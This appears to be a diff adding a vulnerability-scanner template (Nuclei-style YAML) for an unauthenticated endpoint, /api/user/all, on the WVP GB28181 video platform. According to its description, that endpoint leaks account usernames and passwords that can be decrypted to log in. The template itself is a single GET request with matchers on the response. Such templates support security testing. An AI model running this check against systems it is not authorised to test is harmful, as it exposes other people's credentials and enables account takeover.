@@ -1,0 +1,37 @@
+id: wvp-28181-unauth
+
+info:
+  name: WVP 28181 - Unauthorized
+  author: qwtd
+  severity: high
+  description: |
+    WVP视频平台未授权漏洞，/api/user/all接口可以获取到账号密码。解密就能登陆平台了，其余接口也一样。
+  reference:
+    - https://github.com/wy876/POC/blob/3f0a45b0ae99cbabbc28e1dfb046e83e863e1026/WVP%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0/WVP%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0(%E5%9B%BD%E6%A0%8728181)%E6%9C%AA%E6%8E%88%E6%9D%83SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md?plain=1#L16
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    max-request: 1
+  tags: WVP视频平台
+
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/api/user/all'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'username'
+          - 'password'
+          - 'createTime'
+          - 'updateTime'
+        condition: and
+      - type: status
+        status:
+          - 200
